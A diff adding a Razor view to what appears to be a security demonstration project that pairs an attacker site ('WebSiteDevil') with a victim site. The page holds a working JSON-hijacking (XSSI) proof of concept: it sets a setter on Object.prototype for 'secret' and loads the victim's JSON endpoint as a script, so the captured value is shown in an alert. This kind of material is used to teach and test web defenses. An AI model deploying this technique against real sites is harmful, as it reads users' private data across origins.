@@ -1,0 +1,21 @@
+﻿@using WebSiteDevil.Configuration
+@model WebSitesSettings
+@{
+    ViewData["Title"] = "JsonHijacking";
+}
+
+<h1>JsonHijacking</h1>
+
+
+@section Scripts
+ {
+<script type="text/javascript">
+
+    Object.prototype.__defineSetter__('secret', function (obj) {        
+        alert('You have been hacked: ' + obj);        
+    });
+            
+</script>
+<script src="@($"{Model.AngelUri}/Xssi/DemoJsonArray")" defer="defer" ></script>
+}
+
